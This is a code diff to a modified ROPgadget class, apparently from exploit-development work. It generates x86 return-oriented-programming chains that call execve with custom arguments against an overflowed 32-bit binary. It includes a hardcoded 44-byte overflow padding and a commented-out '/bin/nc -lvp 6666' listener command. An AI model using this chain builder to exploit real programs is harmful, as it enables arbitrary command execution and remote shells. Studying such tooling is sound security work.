@@ -12,13 +12,15 @@ from struct import pack
 
 
 class ROPMakerX86(object):
-    def __init__(self, binary, gadgets, padding,liboffset=0x0):
+    def __init__(self, binary, gadgets, padding, execve, liboffset=0x0):
         self.__binary  = binary
         self.__gadgets = gadgets
 
         # If it's a library, we have the option to add an offset to the addresses
         self.__liboffset = liboffset
         self.padding = padding
+
+        self.__execve = execve          ### MODIFIED
 
         self.__generate()
 
@@ -168,16 +170,20 @@ class ROPMakerX86(object):
         #p = b'A' * self.padding
         p = b'A' * 44
         
-        args = [b'/bin/nc',b'-lvp',b'6666']
+        #args = [b'/bin/nc', b'-lvp', b'6666']
         
-        foo = ["/bin/echo","-lvp","6666"]
+        #foo = ["/bin/nc","-lvp","6666"]
+        #foo = ["/usr/bin/python3", "ROPgadget/ROPgadget.py", "--binary", "vuln3-32", "--ropchain"]
         #print(self.PreProcessArgs(foo))
+
+        #args = self.PreProcessArgs(foo) # foo = 
+        print(self.__execve)
 
         stack = dataAddr
         #-----------------------------stack--------------------------
 
-        for i in range(len(args)):
-            arg = args[i]
+        for i in range(len(self.__execve)):
+            arg = self.__execve[i]
             chunk = len(arg) // 4        
             for j in range(chunk): 
                 
@@ -196,8 +202,14 @@ class ROPMakerX86(object):
 
                 #arg each in 4 chunk
 
+            lastWord = arg[len(arg)-4: len(arg)]                          # The last 4 bytes of the current argument
+            locationForNULL = stack                                             # We place the null right at the top of the stack
+
+            if (b'\x07' in lastWord):
+                locationForNULL = stack - (4 - lastWord.index(b'\x07'))         # Write a NULL at the end of the argument
+
             p += pack('<I', popDst["vaddr"]) 
-            p += pack('<I', stack) 
+            p += pack('<I', locationForNULL)    #
             p += self.__custompadding(popDst, {})
 
             p += pack('<I', xorSrc["vaddr"]) 
@@ -212,9 +224,9 @@ class ROPMakerX86(object):
         argindex = 0
         safestack = stack
 
-        #----------------------------------args---------------------------------
+        #----------------------------------args/__execve---------------------------------
 
-        for arg in args:
+        for arg in self.__execve:
 
             p += pack('<I', popDst["vaddr"]) 
             p += pack('<I', stack) 
@@ -478,7 +490,7 @@ class ROPMakerX86(object):
 
         self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-    
+    '''
 
     def PreProcessArgs(self, args):
         # args [foo, bar, baz]
@@ -494,4 +506,4 @@ class ROPMakerX86(object):
                     outargs.append(bytes(arg, "utf-8") + b'\x07'*(4 - len(arg) % 4))       # Adds 0x07 as some padding character - (it's the bell character)
                     break; 
 
-        return outargs
+        return outargs'''
